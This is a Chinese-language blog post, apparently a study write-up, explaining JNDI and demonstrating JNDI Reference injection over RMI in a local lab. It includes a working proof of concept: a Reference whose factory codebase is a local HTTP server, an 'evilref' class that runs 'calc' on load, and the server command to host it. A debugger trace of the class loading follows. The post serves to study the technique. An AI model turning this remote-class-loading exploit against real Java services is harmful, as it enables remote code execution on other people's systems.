<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>JNDI初步学习 | stoocea</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="什么是JNDI在学之前我们得先了解什么是JNDI （Java Naming and Directory Interface）它的中文翻译叫做 java命名和目录的接口，类比一个java的字典，它是为java应用程序提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据或者对象。用于提供基于配置的动态调用。这些对象可以存储在不同的命名或者目录服务中JNDI的服务分为两部分Naming与Di">
<meta property="og:type" content="article">
<meta property="og:title" content="JNDI初步学习">
<meta property="og:url" content="http://example.com/2023/11/02/JNDI%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="stoocea">
<meta property="og:description" content="什么是JNDI在学之前我们得先了解什么是JNDI （Java Naming and Directory Interface）它的中文翻译叫做 java命名和目录的接口，类比一个java的字典，它是为java应用程序提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据或者对象。用于提供基于配置的动态调用。这些对象可以存储在不同的命名或者目录服务中JNDI的服务分为两部分Naming与Di">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/1.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/2.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/3.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/4.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/5.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/6.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/7.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/8.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/9.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/10.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/11.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/12.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/13.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/14.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/15.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/16.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/17.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/18.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/19.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/20.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/21.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/22.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/23.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/24.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/25.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/26.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/27.png">
<meta property="og:image" content="https://stoocea.github.io/images/JNDI/28.png">
<meta property="article:published_time" content="2023-11-01T17:37:51.000Z">
<meta property="article:modified_time" content="2023-11-01T17:41:14.351Z">
<meta property="article:author" content="stoocea">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://stoocea.github.io/images/JNDI/1.png">
  
    <link rel="alternate" href="/atom.xml" title="stoocea" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="https://stoocea.github.io/images/rj3.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="https://stoocea.github.io/images/rj2.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>stoocea </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://stoocea.github.io/images/rj3.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Stoocea </div>
      <div class="dot"></div>
      <div class="subtitle">寻找归属感 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Stoocea" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      



    
      

    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">归档</h3>
      
      
        <a class="archive-link" href="/archives/2023/11 ">
          十一月 2023 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/10 ">
          十月 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/08 ">
          八月 2023 
          <div class="archive-count">1 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <a class="recent-link" href="/2023/11/10/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="FastJson反序列化学习" >
            <div class="recent-link-text">
              FastJson反序列化学习
            </div>
          </a>
        
          <a class="recent-link" href="/2023/11/02/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI初步学习" >
            <div class="recent-link-text">
              JNDI初步学习
            </div>
          </a>
        
          <a class="recent-link" href="/2023/10/24/RMI%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="RMI的基本攻击方式总结" >
            <div class="recent-link-text">
              RMI的基本攻击方式总结
            </div>
          </a>
        
          <a class="recent-link" href="/2023/08/15/blog%E8%BF%81%E7%A7%BB%E5%8A%A8%E6%80%81%E4%BB%A5%E5%8F%8A%E6%9C%80%E8%BF%91%E7%9A%84%E4%BA%8B/" title="blog迁移动态以及最近的事" >
            <div class="recent-link-text">
              blog迁移动态以及最近的事
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-JNDI注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        JNDI初步学习
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-11-01T17:37:51.000Z" itemprop="datePublished">2023-11-02</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
    未分类 
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            5.2k 词 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p>在学之前我们得先了解什么是JNDI （Java Naming and Directory Interface）<br>它的中文翻译叫做 java命名和目录的接口，类比一个java的字典，它是为java应用程序<br>提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据或者对象。用于提供基于配置的动态调用。这些对象可以存储在不同的命名或者目录服务中<br>JNDI的服务分为两部分Naming与Directory<br>Naming的话类似于哈希表的键值对取值和存值，通过键获取对应的服务。<br>Directory是一种特殊的Naming Service 用于类似目录的方式存取服务</p>
<p>具体到哪些服务呢？</p>
<blockquote>
<p>1.RMI<br>2.LDAP 轻量级目录访问协议<br>3.DNS<br>4.CORBA 通用对象服务(COS)名称服务<br>5.JNDI Reference</p>
</blockquote>
<p>LDAP CORBA RMI是采用字符串对应对象，DNS是IP对应域名<br>用字符串对应对象，默认存在一个对象加载的过程，那可能就存在通过反序列化加载恶意对象的情况。这也是漏洞所在</p>
<h3 id="JNDI具体实现-以及JNDI对应RMI原生反序列化攻击"><a href="#JNDI具体实现-以及JNDI对应RMI原生反序列化攻击" class="headerlink" title="JNDI具体实现 以及JNDI对应RMI原生反序列化攻击"></a>JNDI具体实现 以及JNDI对应RMI原生反序列化攻击</h3><p>我们上一节RMI server端还能用，直接拿过来当例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//首先调一个远程服务对象，其实现在就可以进行远程调用了  </span></span><br><span class="line">IRemoteObj remoteObj=<span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();  </span><br><span class="line"><span class="comment">//创建一个注册中心  </span></span><br><span class="line">Registry r= LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line"><span class="comment">//将我们的远程服务对象绑定进注册中心  </span></span><br><span class="line">r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>开启RMI服务之后，来写JNDIRMIServer的代码<br>要用到JNDI要首先new一个 <code>InitialContext</code> 对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是通过JNDI获取到RMI对象，以及调用RMI对象sayHello方法的过程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">IRemoteObj remoteObj= (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>三段代码看下下来其实感觉与RMI的客户端以及服务端之间的调用流程其实挺像的，都是要先获取到对象，之后再调用方法<br>不禁让人会想，JNDI会是调用原生RMI来实现这些过程的吗？实际上确实如此<br>我们跟进lookup的实现过程</p>
<p>首先进入InitialContext类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line"><span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>之后一直跟进到RegistryContext类中的lookup方法，发现它最后还是调用的registry的lookup方法 也就是来到了RMI的调用流程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line"><span class="keyword">if</span> (var1.isEmpty()) &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">Remote var2;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>当然这个并不是重点，不是传统的JNDI注入，我们看到了这个lookup方法就想了想是否存在这个问题</p>
<h2 id="JNDI注入的常见对象-Reference及其攻击"><a href="#JNDI注入的常见对象-Reference及其攻击" class="headerlink" title="JNDI注入的常见对象 Reference及其攻击"></a>JNDI注入的常见对象 Reference及其攻击</h2><p>JNDI注入与所调服务无关，不论是RMI 还是DNS LDAP或者是其他服务，都会存在这个漏洞，而传统的漏洞点存在于JNDI的引用对象的实现流程</p>
<p>首先来一段实现代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">Reference refObj=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;testRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);  </span><br><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteobj&quot;</span>,refObj);  </span><br><span class="line"><span class="comment">//initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;,new RemoteObjImpl());  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们调用到了新的一个对象 Reference，来看一下它的构造方法<br><img src="https://stoocea.github.io/images/JNDI/1.png" alt="1"></p>
<p>有三个参数 第一个是类名 第二个是指定的工厂 第三个是工厂地址<br>首先需要解释的是什么是工厂？<br>类似于动态代理，他会在工厂里写一些代码逻辑，当你调用到它的时候他就会执行这些代码。<br>这么听起来就是一个免费的代码执行点，工厂地址可控的话，那我们就可以传入指定到我们恶意代码执行的”工厂”地址（什么血汗工厂）</p>
<p>那我们可以写一个 evilref恶意类实现以下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilref</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">evilref</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意该恶意类不能与JndiClient JndiServer放在同一目录，是为了让evilref类中不会出现package org.exmple等字样（当时这个报错卡了我好久…..）</p>
<p>在当前项目的class文件夹开启一下本地的http服务(加载的是class字节码文件)<br><code>python -m http.server 7777</code></p>
<p>之后就是运行 JndiClient</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">InitialContext initialContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteobj&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="https://stoocea.github.io/images/JNDI/2.png" alt="1"></p>
<p>发现确实是弹计算器，那我们确实是可以通过这个引用对象来执行代码，只要能够控制工厂地址，指定为我们的恶意地址<br>其实报错的时候我看到了classLoader这种类加载的过程，它肯定是通过了类初始化才执行到我们恶意类的构造方法的。这里为接下来的流程跟进做一个铺垫</p>
<h3 id="JNDI-Reference调用流程"><a href="#JNDI-Reference调用流程" class="headerlink" title="JNDI Reference调用流程"></a>JNDI Reference调用流程</h3><p>个人的JDK关于JNDI的源码下不下来，所以调试的时候无法跟进到源码(记录一下调试流程，师傅们自己跟进的时候肯定没问题)<br>上面我们已经分析过，JNDI的lookup查询实际上是调的RMI原生lookup查询，当我们跟到RegistryContext类的时候，发现它lookup出来的不是Reference对象，而是ReferenceWrapper_Stub对象</p>
<p><img src="https://stoocea.github.io/images/JNDI/3.png" alt="1"></p>
<p>这个ReferenceWrapper_Stub是从哪来的？我们服务端的代码执行到这一步的时候<br><code>initialContext.rebind(&quot;rmi://localhost:1099/remoteobj&quot;,refObj);</code><br>这里是绑定refObj的操作，我们跟进<br><img src="https://stoocea.github.io/images/JNDI/4.png" alt="1"></p>
<p>发现它的rebind方法中的对象参数经过了一个encodeObject的方法处理，我们跟进到这个方法的内容</p>
<p><img src="https://stoocea.github.io/images/JNDI/5.png" alt="1"></p>
<p>发现它是只要判断出我们绑定的这个对象是Reference对象，就会重新实例化一个ReferenceWrapper对象返回，当然这里只是提一嘴，后面的构造内容就不看了，我们继续下一步调用<br>调用完lookup之后<br><img src="https://stoocea.github.io/images/JNDI/6.png" alt="1"></p>
<p>紧接着的是decodeObject方法，想想其实作用就是将ReferenceWrapper_Stub对象再转回Reference对象<br>try块里面的内容就是判断一下传进来的这个ReferenceWrapper_Stub对象类型是否对应，然后再把他转化为Reference对象<br>之后返回一个静态方法的调用 类名是NamingManager</p>
<p><img src="https://stoocea.github.io/images/JNDI/7.png" alt="1"></p>
<p>继续跟进到NamingManager的getObjectInstance方法之前，我们需要在这里停一嘴，目前来说，我们的恶意类还是没有初始化的，但是当我们执行到这的时候，程序已经跳出了RegistryContext类，也就是lookup定位查找到我们的恶意对象的过程已经完结。换句话说，就是我们的恶意类加载的过程不是和RMI绑定的，就是任何一个JNDI可以服务的对象，都有可能存在这个恶意类代码执行</p>
<p><img src="https://stoocea.github.io/images/JNDI/8.png" alt="1"></p>
<p>接着调用getObjectFactoryBuilder()方法，发现返回了一个构造器，没有其他引用，接着往下执行代码<br><img src="https://stoocea.github.io/images/JNDI/9.png" alt="1"></p>
<p>在下面的代码中有一段很重要的方法调用<br>getObjectFactoryFromReference(ref, f);<br>其实就是在这执行的类加载<br><img src="https://stoocea.github.io/images/JNDI/10.png" alt="1"></p>
<p>其实看注释就能够了解到差不多了，它会先试着找一下本地的class loader能不能加载这个类（双亲委派机制），这里用到是AppclassLoader，之后我们肯定当前本地是没有这个类的，所以之后再往下执行<br><img src="https://stoocea.github.io/images/JNDI/11.png" alt="1"></p>
<p>这里定义了一个codebase，调用getFactoryClassLocation得到，也就是获取到我们这个远程工厂的地址<br>然后调用URLclassLoader来加载恶意类</p>
